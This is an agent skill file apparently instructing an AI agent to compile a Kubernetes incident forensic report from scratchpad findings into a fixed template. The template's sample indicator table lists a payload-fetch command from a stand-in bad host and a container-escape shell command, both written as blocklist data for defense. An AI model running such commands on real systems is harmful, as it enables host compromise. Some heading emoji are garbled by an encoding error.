---
name: reporter
description: "Your task is to convert raw, multi-node investigative scratchpads into a high-visibility, executive-ready forensic document that maintains a clear evidence trail, multi-master attribution metrics, and an instantly scannable blocklist repository."
---
# Forensic Reporting Mission
Your task is to convert raw, multi-node investigative scratchpads into a high-visibility, executive-ready forensic document that maintains a clear evidence trail, multi-master attribution metrics, and an instantly scannable blocklist repository.

## 1. Input Requirements
- **Required Ingest Target:** `./vault/Analysis_Scratchpad.md`
- Do not begin writing until the `investigator` skill has explicitly confirmed the generation of this file.

## 2. Report Compilation Framework
Format the final summary inside a new file located at `./vault/Final_Incident_Report.md` using the following strict template layout:

```markdown
# ÃƒÂ°Ã…Â¸Ã…Â¡Ã‚Â¨ Incident Forensic Summary Report

## 1. Executive Summary
[Provide a high-level, 3-sentence summary detailing who did what, when it happened, and the overall business impact on cluster infrastructure across both application workloads and physical node tiers.]

## 2. ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â¯ Indicators of Compromise (IoC) Quick-Block
> **SIEM / Firewall Ingestion Note:** Use these high-fidelity artifacts to instantly update your defense systems and blocklists.

| Indicator Type | Malicious Value / Context | Source Telemetry File | Telemetry Layer |
| :--- | :--- | :--- | :--- |
| `External IP` | `185.190.140.2` | `logs/control-plane-01_2026-06_audit.txt` | Control-Plane Audit |
| `Command String` | `curl -s http://badsite.com/elf` | `logs/worker-node-02_2026-06_runtime_daemon_containerd.txt` | Host Daemon Log |
| `ServiceAccount` | `system:serviceaccount:default:attacker-token` | `logs/compromised-pod_manifest.txt` | Workload Manifest |

## 3. Incident Key Metrics
- **Impacted Application Namespace:** - **Compromised Pod Assets:** - **Threat Actor Identity:** - **Exploited API Capability:** - **Breached Infrastructure Nodes:** [List all impacted Control Plane Master and Worker Node names sequentially]

## 4. Technical Root Cause Analysis & MITRE Mapping
[Detail the specific API vector, load-balancer routing behavior, or compromised service account credential that allowed the entry pattern based on the multi-node findings timeline.]

## 5. ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â  Distributed Forensic Evidence Ledger (Chain of Custody)
| Identified Tactic / Finding | Log Influx Source Node | Source Telemetry File | Telemetry Layer | Key Match Indicator |
| :--- | :--- | :--- | :--- | :--- |
| *Example: T1611 Host Escape* | `worker-node-02` | `logs/worker-node-02_runtime_daemon_containerd.txt` | Host Daemon Log | `unshare -m /bin/sh` |

## 6. Immediate Remediation Steps
- [ ] Revoke or restrict the specific compromised ServiceAccount / User token across all cluster contexts.
- [ ] Implement tighter RBAC rules against the exploited Verbs.
- [ ] Rotate worker node SSH access configurations and cycle underlying container runtime daemon encryption secrets.
